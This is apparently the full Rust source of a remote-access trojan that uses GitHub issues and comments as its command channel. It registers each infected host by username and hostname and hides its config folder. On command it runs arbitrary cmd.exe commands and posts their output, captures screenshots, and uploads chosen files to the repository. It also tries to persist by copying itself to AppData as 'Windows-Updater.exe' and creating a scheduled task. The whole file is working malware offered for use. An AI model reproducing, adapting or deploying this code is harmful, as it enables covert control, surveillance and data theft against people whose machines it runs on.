//#![windows_subsystem = "windows"]
use octocrab::Octocrab;
use std::fs::File;
use secrecy::Secret;
use screenshots::Screen;
use std::io::{Read, Write};
use std::process::Command;
use whoami::username;
use std::env;
use std::fs;
use std::path::Path;
use rand::Rng;



#[tokio::main]
pub async fn main() -> Result<(), Box<dyn std::error::Error>> {
    

    let name = whoami::username();
    let pc = whoami::hostname();
   

    // Hardcoded GitHub token
    // it looks like this "github_pat_1NVWI0MV8MRLLyZ33U_xMgPd8r851dHcUVoSxg5VwtIp4uyFSAktRjZL1XJE72DU4W"
    let github_token = Secret::new("TOKEN_HERE".to_string());
    
    // Create an Octocrab instance
    let octocrab = Octocrab::builder()
        .personal_token(github_token)
        .build()?;

    //Declare owner and repo variables
    let owner = "repo_owner";
    let repo = "repo_name";

    let username = username(); // Get the current username using `whoami` crate
    let pat = format!(r#"C:\Users\{}\AppData\Local\.config\"#, username.replace("\0", "")); // Construct path using username
    fs::create_dir_all(&pat)?;

    // Hide the directory using `attrib +h` command 
    Command::new("attrib")
        .args(&["+h", &pat])
        .output()?;




    // Check if the file exists
    if let Err(_) = File::open(format!("{}conf.txt", pat)) {
        // File does not exist, create it
        
        let issue = octocrab.issues(owner, repo).create(format!("{}{}", name,pc)).send().await?;
        let issue_number = issue.number;
        let mut file = File::create(format!("{}conf.txt", pat))?;
        let issue_number_bytes = issue_number.to_string().into_bytes();
        file.write_all(&issue_number_bytes)?; // Write some content to the file
        println!("File created successfully.");
        let mut agent_file = File::open(format!("{}conf.txt", pat))?;
        // Read the contents of the file into a string
        let mut contents = String::new();
        agent_file.read_to_string(&mut contents)?;
        let issue_no = match contents.trim().parse::<u64>() {
            Ok(num) => num,
            Err(err) => {
                eprintln!("Failed to parse issue number: {}", err);
                return Ok(()); 
            }
        };
        octocrab.issues(owner, repo).create_comment(issue_no, "new one").await?;
        loop {
            let comments = octocrab
                .issues(owner, repo)
                .list_comments(issue_no.into())
                .per_page(100)
                .send()
                .await?;
            for comment in &comments.items.last() {
                if let Some(arguments) = &comment.body {
                    // Split the body of the comment into arguments
                    let mut arguments = arguments.splitn(2, ' ');
                    match arguments.next() {
                        Some("cmd") => {
                            // Call predefined function for "cmd" command
                            if let Some(execute) = arguments.next() {
                                let output = Command::new("cmd.exe")
                                    .arg("/c")
                                    .arg(execute)
                                    .output()
                                    .expect("failed to execute process");
                                octocrab
                                    .issues(owner, repo)
                                    .create_comment(issue_no, &format!("```{}\n```", String::from_utf8_lossy(&output.stdout)))
                                    .await?;
                            }
                        }
                        Some("persist") => {
                        
              
                            let username_output = Command::new("whoami").output().expect("Failed to execute whoami");
                            let username = std::str::from_utf8(&username_output.stdout).expect("Failed to parse username").trim();
                            if let Ok(appdata) = env::var("APPDATA") {
        			            let backdoor_location = format!("{}\\Windows-Updater.exe", appdata);
        		                if !Path::new(&backdoor_location).exists() {
            			            if let Err(_err) = fs::copy(std::env::current_exe().unwrap(), &backdoor_location) {
                                        let output = Command::new("schtasks").args(&["/create", "/sc", "minute", "/mo", "1", "/tn", "MyRustTask", "/tr", "calc.exe", "/ru", &username, "/f"]).output().expect("Failed to create scheduled task");
                                    }else {    
                                        println!("Failed to copy executable to");
                                    }
                                }
                            }
                        }    
                        Some("screenshot") => {
                            let screens = Screen::all().unwrap();
                    	    let mut buffer: Vec<u8> = Vec::new();

                    for screen in screens
                    {
                        let image = screen.capture().unwrap();
                        buffer = image.to_png().unwrap();
                    }
                    let message = "Uploaded successfully";
                    let new_id = rand::thread_rng().gen_range(1..=10000);
                    octocrab.repos(owner, repo).create_file(format!("{}.png",&new_id), message, &buffer).branch("main") .send().await?;
                            octocrab.issues(owner, repo).create_comment(issue_no, "done screenshot").await?;
                            println!("screenshot");
                        }
                        Some("download") => {
                            // Call predefined function for "download" command
                            println!("Download");
                            if let Some(path) = arguments.next() {
                                let path_buf = Path::new(&path);
                                println!("File path: {}", path_buf.display());
                        
                                match File::open(&path_buf) {
                                    Ok(mut file) => {
                                        let mut content = Vec::new();
                                        file.read_to_end(&mut content)?;
                        
                                        // Construct the path on the repository
                                        let path_on_repo = format!("{}", path);
                        
                                        // Define the commit message
                                        let message = "Uploaded successfully";
                        
                                        // Create the file on the repository
                                        octocrab
                                            .repos(owner, repo)
                                            .create_file(&path_on_repo, message, &content)
                                            .branch("main") // Specify the branch to commit to (e.g., "main" or "master")
                                            .send()
                                            .await?;
                                        octocrab.issues(owner, repo).create_comment(issue_no, "Uploaded. Check your repo").await?;
                                    },
                                    Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                                        octocrab.issues(owner, repo).create_comment(issue_no, "File not found").await?;
                                        println!("File not found: {}", path_buf.display());
                                    },
                                    Err(e) => {
                                        octocrab.issues(owner, repo).create_comment(issue_no, "Failed to open file").await?;
                                        println!("Failed to open file: {}", e);
                                    },
                                }
                            } else {
                                println!("No path provided for download command");
                            }
                           
                        }
                        _ => {
                            println!("No New Commands");
                        }
                    }
                } else {
                    println!("Last comment has no body");
                }
            }
            }
        
    } else {
        // File exists
        let mut agent_file = File::open(format!("{}conf.txt", pat))?;
        // Read the contents of the file into a string
        let mut contents = String::new();
        agent_file.read_to_string(&mut contents)?;
        println!("File already exists.");
        let issue_no = match contents.trim().parse::<u64>() {
            Ok(num) => num,
            Err(err) => {
                eprintln!("Failed to parse issue number: {}", err);
                return Ok(()); // Or handle the error in another way
            }
        };

        octocrab.issues(owner, repo).create_comment(issue_no, "back online").await?;
    }
    Ok(())

}


    

